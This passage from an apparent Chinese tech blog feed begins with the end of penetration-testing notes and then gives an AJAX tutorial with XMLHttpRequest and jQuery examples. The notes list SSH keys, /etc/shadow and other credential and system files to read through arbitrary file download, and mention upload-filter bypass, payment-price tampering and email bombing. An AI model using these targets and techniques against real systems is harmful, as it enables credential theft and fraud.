//Mysql配置C:\Program Files\mysql\data\mysql\user.MYD //Mysql rootC:\Windows\php.ini //php配置信息C:\Windows\my.ini //Mysql配置信息C:\Windows\win.ini //Windows系统的一个基本系统配置文件Linux：/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts //记录每个访问计算机用户的公钥/etc/passwd/etc/shadow/etc/my.cnf //mysql配置文件/etc/httpd/conf/httpd.conf //apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数</code></pre><h2 id="16敏感文件下载"><a href="#16敏感文件下载" class="headerlink" title="16敏感文件下载"></a>16敏感文件下载</h2><p>windows下不区分大小写，linux下区分大小写</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717009822.png" alt="任意下载"></p><h2 id="17-文件上传（前端拦截）"><a href="#17-文件上传（前端拦截）" class="headerlink" title="17 文件上传（前端拦截）"></a>17 文件上传（前端拦截）</h2><p>javascript判断  浏览器禁用js 上传</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717014295.png" alt="浏览器禁用js "></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717017943.png" alt="浏览器禁用js "></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717020411.png" alt="浏览器禁用js "></p><h2 id="23支付漏洞"><a href="#23支付漏洞" class="headerlink" title="23支付漏洞"></a>23支付漏洞</h2><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717023747.png" alt="抓包"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717026852.png" alt="修改"></p><p>修改price参数</p><h2 id="24-邮箱轰炸"><a href="#24-邮箱轰炸" class="headerlink" title="24.邮箱轰炸"></a>24.邮箱轰炸</h2><p>抓包</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717034664.png" alt="邮箱轰炸"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717039204.png" alt="邮箱轰炸"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717042437.png" alt="邮箱轰炸"></p>]]></content>
      
      
      <categories>
          
          <category> safe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 思路 </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b/s(浏览器与服务器)通信-ajax篇,从入门到放弃</title>
      <link href="/posts/9bed.html"/>
      <url>/posts/9bed.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。<br>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。<br>传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。</p></blockquote><h2 id="什么是ajax："><a href="#什么是ajax：" class="headerlink" title="什么是ajax："></a>什么是ajax：</h2><p><strong>AJAX不是一种编程语言。AJAX只使用以下组合：</strong></p><ul><li>浏览器内置XMLHttpRequest对象（用于从Web服务器请求数据）</li><li>JavaScript和HTML DOM（显示或使用数据）</li></ul><h2 id="ajax能干嘛"><a href="#ajax能干嘛" class="headerlink" title="ajax能干嘛"></a>ajax能干嘛</h2><p><strong>前后端做数据交互</strong></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>异步<ul><li>异步和同步的区别:<ul><li>同步是请求发过去,要等着回应;</li><li>异步:不需要等回应,可以进行其他操作</li></ul></li></ul></li><li>局部刷新:<ul><li>页面元素不改变，只改变请求数据</li><li>案例<br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/ajax%E7%99%BE%E5%BA%A6%E6%A1%88%E4%BE%8B.gif" alt="ajax百度案例"></li></ul></li><li>更加快的响应能力。</li><li>减少冗余请求，减轻了服务器负担</li><li>基于标准化的并被广泛支持的技术，不需要下载插件或者小程序</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>ajax干掉了back按钮，即对浏览器后退机制的破坏。</li><li>存在一定的安全问题。</li><li>对搜索引擎的支持比较弱。</li><li>破坏了程序的异常机制。</li><li>无法用URL直接访问</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li>场景 1. 数据验证</li><li>场景 2. 按需取数据</li><li>场景 3. 自动更新页面<h1 id="JavaScript-ajax"><a href="#JavaScript-ajax" class="headerlink" title="JavaScript ajax"></a>JavaScript ajax</h1><h2 id="XMLHttpRequest对象"><a href="#XMLHttpRequest对象" class="headerlink" title="XMLHttpRequest对象"></a>XMLHttpRequest对象</h2><blockquote><p>AJAX的基石是XMLHttpRequest对象。<br>所有现代浏览器都支持XMLHttpRequest对象。XMLHttpRequest对象可用于在幕后与Web服务器交换数据。这意味着可以更新网页的各个部分，而无需重新加载整个页面。</p></blockquote></li></ul><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584087284115.png" alt="XMLHttpRequest属性"></p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584087323723.png" alt="XMLHttpRequest对象的方法"></p><h3 id="普通get请求"><a href="#普通get请求" class="headerlink" title="普通get请求"></a>普通get请求</h3><pre class=" language-accesslog"><code class="language-accesslog">xmlhttp.open("GET","/try/ajax/demo_get.php",true);xmlhttp.send()</code></pre><h3 id="带参数get请求"><a href="#带参数get请求" class="headerlink" title="带参数get请求"></a>带参数get请求</h3><pre><code>xmlhttp.open(&quot;GET&quot;,&quot;/try/ajax/demo_get2.php?fname=Henry&amp;lname=Ford&quot;,true);xmlhttp.send();</code></pre><h3 id="普通post请求"><a href="#普通post请求" class="headerlink" title="普通post请求"></a>普通post请求</h3><pre class=" language-accesslog"><code class="language-accesslog">xmlhttp.open("POST","/try/ajax/demo_post.php",true);xmlhttp.send();</code></pre><h3 id="带参post请求"><a href="#带参post请求" class="headerlink" title="带参post请求"></a>带参post请求</h3><pre class=" language-accesslog"><code class="language-accesslog">xmlhttp.open("POST","/try/ajax/demo_post2.php",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send("fname=Henry&lname=Ford");</code></pre><h2 id="xmlhttprequest-对象get-demo"><a href="#xmlhttprequest-对象get-demo" class="headerlink" title="xmlhttprequest 对象get demo"></a>xmlhttprequest 对象get demo</h2><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                btn<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">var</span> ajax<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/*1.创建XMLHttpRequest对象*/</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">//  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span>                        ajax <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// IE6, IE5 浏览器执行代码</span>                        ajax <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">/*设置请求方式和地址  默认是异步*/</span>                    ajax<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://rap2.taobao.org:38080/app/mock/247071/example/1584090851227"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/*发送请求*/</span>                    ajax<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/*注册回调函数*/</span>                    ajax<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>ajax<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> ajax<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> ajax<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>                            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ajax<span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>这里是ajax显示的地方<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span>ajax请求<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="xmlhttprequest-对象post-demo"><a href="#xmlhttprequest-对象post-demo" class="headerlink" title="xmlhttprequest 对象post demo"></a>xmlhttprequest 对象post demo</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">'email='</span>  <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">'&amp;password='</span>  <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://www.example.com'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> success<span class="token punctuation">,</span> fail<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 1. 创建连接</span>    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 2. 连接服务器</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 3. 发送请求</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 4. 接受请求</span>    xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">success</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// fail</span>                fail <span class="token operator">&amp;&amp;</span> <span class="token function">fail</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><h3 id="XMLHttpRequest-status"><a href="#XMLHttpRequest-status" class="headerlink" title="XMLHttpRequest.status"></a>XMLHttpRequest.status</h3><ul><li>200, OK，访问正常</li><li>301, Moved Permanently，永久移动</li><li>302, Move temporarily，暂时移动</li><li>304, Not Modified，未修改</li><li>307, Temporary Redirect，暂时重定向</li><li>401, Unauthorized，未授权</li><li>403, Forbidden，禁止访问</li><li>404, Not Found，未发现指定网址</li><li>500, Internal Server Error，服务器发生错误</li></ul><h3 id="send方法"><a href="#send方法" class="headerlink" title="send方法"></a>send方法</h3><p><strong>send方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数</strong></p><ul><li>void send();</li><li>void send(ArrayBufferView data);</li><li>void send(Blob data);</li><li>void send(Document data);</li><li>void send(String data);</li><li>void send(FormData data);<h3 id="readyState"><a href="#readyState" class="headerlink" title="readyState"></a>readyState</h3></li><li>0：请求未初始化（还没有调用 open()）。</li><li>1：请求已经建立，但是还没有发送（还没有调用 send()）。</li><li>2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。</li><li>3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。</li><li>4：响应已完成；您可以获取并使用服务器的响应了。</li></ul><h1 id="Jquery-ajax"><a href="#Jquery-ajax" class="headerlink" title="Jquery ajax"></a>Jquery ajax</h1><h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><pre class=" language-mathematica"><code class="language-mathematica">$.get(URL,callback);必需的 URL 参数规定您希望请求的 URL。可选的 callback 参数是请求成功后所执行的函数名（回调函数）。</code></pre><pre class=" language-haskell"><code class="language-haskell"><span class="token operator">$.</span><span class="token hvariable">post</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">,</span><span class="token keyword">data</span><span class="token punctuation">,</span><span class="token hvariable">callback</span><span class="token punctuation">)</span><span class="token punctuation">;</span>必需的 <span class="token constant">URL</span> 参数规定您希望请求的 <span class="token constant">URL</span>。可选的 <span class="token keyword">data</span> 参数规定连同请求发送的数据。可选的 <span class="token hvariable">callback</span> 参数是请求成功后所执行的函数名。</code></pre><h2 id="get"><a href="#get" class="headerlink" title="$get"></a>$get</h2><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery-3.2.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"http://rap2.taobao.org:38080/app/mock/247071/example/1584090851227"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="post"><a href="#post" class="headerlink" title="$post"></a>$post</h2><pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery-3.2.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#btn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"http://rap2.taobao.org:38080/app/mock/247071/aa1"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                        username<span class="token punctuation">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#userName"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userName<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>输入用户名<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><h2 id="ajax-方法"><a href="#ajax-方法" class="headerlink" title="ajax()方法"></a>ajax()方法</h2><ul><li>async                    布尔值，表示请求是否异步处理。默认是 true。</li><li>beforeSend(xhr)            发送请求前运行的函数。</li><li>cache                    布尔值，表示浏览器是否缓存被请求页面。默认是 true。</li><li>complete(xhr,status)    请求完成时运行的函数（在请求成功或失败之后均调用，即在 success 和 error 函数之后）。</li><li>contentType                发送数据到服务器时所使用的内容类型。默认是：”application/x-www-form-urlencoded”。</li><li>context                    为所有 AJAX 相关的回调函数规定 “this” 值。</li><li>data                    规定要发送到服务器的数据。</li><li>dataFilter(data,type)    用于处理 XMLHttpRequest 原始响应数据的函数。</li><li>dataType                预期的服务器响应的数据类型。</li><li>error(xhr,status,error)    如果请求失败要运行的函数。</li><li>global                    布尔值，规定是否为请求触发全局 AJAX 事件处理程序。默认是 true。</li><li>ifModified                布尔值，规定是否仅在最后一次请求以来响应发生改变时才请求成功。默认是 false。</li><li>jsonp                    在一个 jsonp 中重写回调函数的字符串。</li><li>jsonpCallback            在一个 jsonp 中规定回调函数的名称。</li><li>password                规定在 HTTP 访问认证请求中使用的密码。</li><li>processData                布尔值，规定通过请求发送的数据是否转换为查询字符串。默认是 true。</li><li>scriptCharset            规定请求的字符集。</li><li>success(result,status,xhr)    当请求成功时运行的函数。</li><li>timeout                    设置本地的请求超时时间（以毫秒计）。</li><li>traditional                布尔值，规定是否使用参数序列化的传统样式。</li><li>type                    规定请求的类型（GET 或 POST）。</li><li>url                        规定发送请求的 URL。默认是当前页面。</li><li>username                规定在 HTTP 访问认证请求中使用的用户名。</li><li>xhr                        用于创建 XMLHttpRequest 对象的函数。</li></ul><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><pre class=" language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>用户名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>密码:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pwd<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'pwd'</span><span class="token punctuation">:</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#pwd'</span><span class="token punctuation">)</span><span class="token 